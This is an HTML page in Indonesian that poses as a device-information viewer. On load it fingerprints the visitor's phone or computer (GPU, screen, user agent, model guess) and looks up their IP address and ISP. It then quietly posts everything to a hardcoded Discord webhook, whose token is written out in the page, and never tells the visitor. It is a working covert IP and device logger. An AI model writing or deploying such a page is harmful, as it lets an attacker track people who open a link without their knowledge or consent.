<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Device Intelligence</title>
    <style>
        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; display: flex; justify-content: center; min-height: 100vh; align-items: center; }
        .card { background: #1e293b; padding: 25px; border-radius: 16px; width: 100%; max-width: 550px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); border: 1px solid #334155; }
        h2 { color: #38bdf8; text-align: center; margin-bottom: 20px; }
        .info-group { background: #0f172a; padding: 12px 16px; border-radius: 8px; margin-bottom: 10px; border-left: 4px solid #38bdf8; }
        .label { color: #64748b; font-size: 11px; text-transform: uppercase; font-weight: 700; display: block; }
        .value { color: #e2e8f0; font-size: 14px; font-weight: 500; display: block; margin-top: 4px; }
        .status { text-align: center; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: bold; margin-top: 20px; }
        .success { background: rgba(52, 211, 153, 0.1); color: #34d399; }
        .loading { background: rgba(251, 191, 36, 0.1); color: #fbbf24; }
    </style>
</head>
<body>

<div class="card">
    <h2>🔍 Device Intelligence Pro</h2>
    
    <div class="info-group">
        <span class="label">Brand & Model</span>
        <span id="ui-product" class="value">Mendeteksi...</span>
    </div>

    <div class="info-group">
        <span class="label">Chipset & Hardware</span>
        <span id="ui-chipset" class="value">Menganalisis...</span>
    </div>

    <div class="info-group">
        <span class="label">GPU Renderer</span>
        <span id="ui-gpu" class="value">Menganalisis...</span>
    </div>

    <div class="info-group">
        <span class="label">Screen Details (Res/DPI)</span>
        <span id="ui-screen" class="value">Menghitung...</span>
    </div>

    <div class="info-group">
        <span class="label">Network & IP</span>
        <span id="ui-network" class="value">Menghubungkan...</span>
    </div>

    <div id="status" class="status loading">⚙️ Memproses Data...</div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

    function getGPUData() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { renderer: "WebGL Unsupported", vendor: "Unknown" };

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : gl.getParameter(gl.RENDERER),
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_INFO) : gl.getParameter(gl.VENDOR)
            };
        } catch (e) {
            return { renderer: "Detection Blocked", vendor: "Unknown" };
        }
    }

    async function startCapture() {
        const gpu = getGPUData();
        const screenW = window.screen.width;
        const screenH = window.screen.height;
        const dpr = window.devicePixelRatio;
        const ua = navigator.userAgent;
        
        let brand = "Unknown";
        let model = navigator.platform;
        let chipset = "Unknown SoC";

        // 1. Logika Deteksi iPhone via Resolusi
        if (/iPhone|iPad/.test(ua)) {
            brand = "Apple";
            if (dpr === 3) {
                if (screenW === 430 || screenH === 932) model = "iPhone 15/16 Pro Max";
                else if (screenW === 393 || screenH === 852) model = "iPhone 15/16 Pro";
                else if (screenW === 428 || screenH === 926) model = "iPhone 13/14 Pro Max";
                else if (screenW === 390 || screenH === 844) model = "iPhone 13/14/15";
                else model = "iPhone (High-End)";
            } else {
                model = "iPhone/iPad (Standard)";
            }
            chipset = "Apple Silicon Bionic";
        } 
        // 2. Logika Deteksi Android
        else if (/Android/.test(ua)) {
            const match = ua.match(/Android\s+([^\s;]+);?\s+([^;]+)\s+Build/);
            brand = "Android Device";
            model = match ? match[2] : "Generic Android";
            
            if (gpu.renderer.includes("Adreno")) chipset = "Qualcomm Snapdragon";
            else if (gpu.renderer.includes("Mali")) chipset = "MediaTek / Exynos";
        }

        // 3. Info Jaringan
        let ipData = { ip: "Gagal mendeteksi", org: "Unknown" };
        try {
            const res = await fetch('https://ipapi.co/json/');
            ipData = await res.json();
        } catch (e) {}

        // Update UI
        document.getElementById('ui-product').innerText = `${brand} - ${model}`;
        document.getElementById('ui-chipset').innerText = chipset;
        document.getElementById('ui-gpu').innerText = gpu.renderer;
        document.getElementById('ui-screen').innerText = `${screenW}x${screenH} px (Ratio: ${dpr})`;
        document.getElementById('ui-network').innerText = `${ipData.ip} (${ipData.org})`;

        // Kirim ke Discord
        const payload = {
            embeds: [{
                title: "🚨 Perangkat Terdeteksi",
                color: 2326507,
                fields: [
                    { name: "📱 Perangkat", value: `**Brand:** ${brand}\n**Model:** ${model}\n**Platform:** ${navigator.platform}`, inline: true },
                    { name: "⚙️ Hardware", value: `**Chipset:** ${chipset}\n**GPU:** ${gpu.renderer}`, inline: true },
                    { name: "🖥️ Layar", value: `**Resolusi:** ${screenW}x${screenH}\n**DPI/DPR:** ${dpr}`, inline: true },
                    { name: "🌐 Jaringan", value: `**IP:** ${ipData.ip}\n**ISP:** ${ipData.org}`, inline: false },
                    { name: "🔧 User Agent", value: `\`\`\`${ua}\`\`\`` }
                ]
            }]
        };

        fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        
        document.getElementById('status').innerText = "✅ Selesai";
        document.getElementById('status').className = "status success";
    }

    window.onload = () => setTimeout(startCapture, 500);
</script>
</body>
</html>
